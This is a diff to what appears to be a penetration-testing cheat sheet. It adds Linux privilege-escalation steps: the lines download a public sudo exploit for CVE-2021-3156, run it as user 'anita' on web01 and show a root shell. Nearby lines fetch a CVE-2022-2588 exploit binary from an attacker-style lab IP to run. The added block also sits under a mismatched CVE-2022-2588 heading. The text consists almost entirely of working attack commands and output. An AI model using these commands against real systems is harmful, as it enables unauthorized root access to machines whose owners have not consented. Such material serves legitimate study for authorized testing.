@@ -1359,6 +1359,19 @@ gcc 624.c -m32 -o exploit
 ### Kernel Expoits
 #### CVE-2022-2588
 ````
+wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
+chmod +x exploit_nss.py
+
+anita@web01:~$ id
+uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
+
+
+anita@web01:~$ python3 exploit_nss.py 
+# whoami
+root
+````
+#### CVE-2022-2588
+````
 git clone https://github.com/Markakd/CVE-2022-2588.git
 wget http://192.168.119.140/exp_file_credential
 chmod +x exp_file_credential
